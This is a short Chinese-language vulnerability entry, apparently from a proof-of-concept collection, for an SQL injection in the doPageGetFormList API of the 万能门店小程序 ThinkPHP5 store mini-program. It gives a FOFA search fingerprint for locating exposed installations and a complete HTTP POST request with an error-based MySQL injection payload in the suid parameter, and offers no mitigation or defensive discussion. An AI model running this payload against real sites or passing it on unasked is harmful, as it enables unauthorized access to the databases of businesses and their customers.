# 万能门店小程序doPageGetFormList存在sql注入漏洞

万能门店小程序DIY建站无限独立版非微擎应用，独立版是基于国内很火的ThinkPHP5框架开发的，适用于各行各业小程序、企业门店小程序，万能门店小程序doPageGetFormList存在sql注入漏洞

## fofa

```javascript
"/comhome/cases/index.html" 
```

## poc

```javascript
POST /api/wxapps/doPageGetFormList HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

suid='AND GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)-- bdmV
```

